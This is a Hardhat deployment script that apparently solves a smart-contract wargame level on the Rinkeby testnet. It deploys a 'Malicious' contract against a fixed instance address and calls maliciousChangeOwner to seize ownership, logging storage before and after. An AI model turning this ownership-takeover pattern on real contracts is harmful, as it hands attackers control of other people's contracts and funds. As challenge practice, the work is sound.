/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const INSTANCE = "0x227036AbA913810069241bd035A79672e272dC1a"
const {deployed} = require('./deployed')


async function instanceState(rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  const signer = new ethers.Wallet( process.env.DEPLOYER_PRIVATE_KEY, rinkeby )

  console.log(`deploying malicious.sol with ${deployer.address}`)
  let Malicious = await hre.ethers.getContractFactory('Malicious')
  let malicious = await Malicious.deploy(INSTANCE)

  await malicious.deployed()

  await deployed('Malicious', hre.network.name, malicious.address);

  console.log('Contract functions:')
  console.log(malicious.functions, '\n')

  await instanceState(rinkeby)
  console.log("Malicious storage")
  console.log("Storage '0'", await rinkeby.getStorageAt(malicious.address, 0))

  //step 1 call function changeowner with the malicious contract
  console.log("SETP 1")
  console.log("Transaction sent waiting for validation...")
  const tx = await malicious.maliciousChangeOwner(deployer.address)
  await tx.wait()
  console.log("transaction confirmed !")

   await instanceState(rinkeby)
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
